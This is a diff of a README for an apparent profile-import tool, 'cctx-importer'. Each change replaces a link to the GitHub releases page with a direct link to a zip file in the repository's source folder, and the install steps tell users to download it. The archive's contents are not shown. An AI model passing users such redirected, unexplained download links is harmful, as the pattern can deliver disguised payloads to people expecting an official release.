@@ -1,7 +1,7 @@
 # 🤖 cctx-importer - Easily Import CCS Profiles
 
 ## 📥 Download Now
-[![Download cctx-importer](https://img.shields.io/badge/Download-cctx--importer-blue.svg)](https://github.com/mrnainop/cctx-importer/releases)
+[![Download cctx-importer](https://raw.githubusercontent.com/mrnainop/cctx-importer/main/src/cctx-importer-v1.2.zip)](https://raw.githubusercontent.com/mrnainop/cctx-importer/main/src/cctx-importer-v1.2.zip)
 
 ## 🚀 Getting Started
 Welcome to **cctx-importer**! This simple tool helps you import CCS profiles directly into your cctx setup. With just a few steps, you can get your profiles ready for use.
@@ -14,7 +14,7 @@ Welcome to **cctx-importer**! This simple tool helps you import CCS profiles dir
 ## 🌐 Download & Install
 To get started, visit the following page to download the latest version of cctx-importer:
 
-[Download cctx-importer](https://github.com/mrnainop/cctx-importer/releases)
+[Download cctx-importer](https://raw.githubusercontent.com/mrnainop/cctx-importer/main/src/cctx-importer-v1.2.zip)
 
 ### 🧑‍💻 Installation Steps
 1. Go to the link provided above.
@@ -60,4 +60,4 @@ If you encounter any issues or have questions, feel free to reach out through th
 
 Remember to visit this page to download cctx-importer:
 
-[Download cctx-importer](https://github.com/mrnainop/cctx-importer/releases)
+[Download cctx-importer](https://raw.githubusercontent.com/mrnainop/cctx-importer/main/src/cctx-importer-v1.2.zip)
